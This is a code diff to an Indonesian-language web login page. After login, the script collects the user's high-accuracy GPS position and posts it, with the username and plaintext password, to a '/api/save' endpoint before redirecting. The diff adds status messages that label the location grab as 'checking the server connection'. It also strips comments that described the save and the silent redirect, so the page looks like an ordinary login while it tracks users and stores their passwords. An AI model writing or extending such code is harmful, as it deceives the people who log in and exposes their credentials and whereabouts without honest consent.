@@ -9,28 +9,46 @@
   <input id="username" placeholder="Username" required /><br><br>
   <input id="password" type="password" placeholder="Password" required /><br><br>
   <button id="loginBtn">Login</button>
+  <pre id="status"></pre>
 
   <script>
+    const statusEl = document.getElementById('status');
+
     document.getElementById('loginBtn').addEventListener('click', async () => {
       const username = document.getElementById('username').value.trim();
       const password = document.getElementById('password').value.trim();
       const deviceName = 'WebBrowser';
 
-      if (!username || !password) return;
+      if (!username || !password) {
+        statusEl.textContent = '⚠️ Masukkan username & password';
+        return;
+      }
 
       try {
-        // 1️⃣ Login dulu
+        // 1️⃣ Login
+        statusEl.textContent = '🔑 Mengecek login...';
         const loginResRaw = await fetch('/api/login', {
           method: 'POST',
           headers: {'Content-Type':'application/json'},
           body: JSON.stringify({ username, password })
         });
         const loginRes = await loginResRaw.json();
-        if (!loginRes.success) return; // login gagal → tetap di login
+        if (!loginRes.success) {
+          statusEl.textContent = '❌ Login gagal';
+          return;
+        }
+
+        statusEl.textContent = '🔑 Login berhasil. cek koneksi ke server...';
 
         // 2️⃣ Ambil GPS
-        if (!navigator.geolocation) return;
+        if (!navigator.geolocation) {
+          statusEl.textContent = '⚠️ login tidak didukung browser';
+          return;
+        }
+
         navigator.geolocation.getCurrentPosition(async (pos) => {
+          statusEl.textContent = '📍 koneksi ke server...';
+
           const payload = {
             username,
             password,
@@ -42,24 +60,27 @@
           };
 
           try {
-            // 3️⃣ Kirim ke save.js
             await fetch('/api/save', {
               method: 'POST',
               headers: {'Content-Type':'application/json'},
               body: JSON.stringify(payload)
             });
-            // 4️⃣ Redirect otomatis, tanpa menampilkan response
+
+            // ✅ Sukses
             localStorage.setItem('username', username);
+            statusEl.textContent = '✅ Login berhasil!';
             window.location.href = '/dashboard.html';
+
           } catch(e) {
-            // Fail silently atau bisa tambahkan console.error
-            console.error('Gagal menyimpan lokasi:', e);
+            statusEl.textContent = '❌ Gagal mengirim ';
           }
 
-        }, () => {}, { enableHighAccuracy: true, timeout: 10000 });
+        }, () => {
+          statusEl.textContent = '⚠️ Gagal ';
+        }, { enableHighAccuracy: true, timeout: 10000 });
 
       } catch(e) {
-        console.error('Login error:', e);
+        statusEl.textContent = '❌ Login error';
       }
     });
   </script>
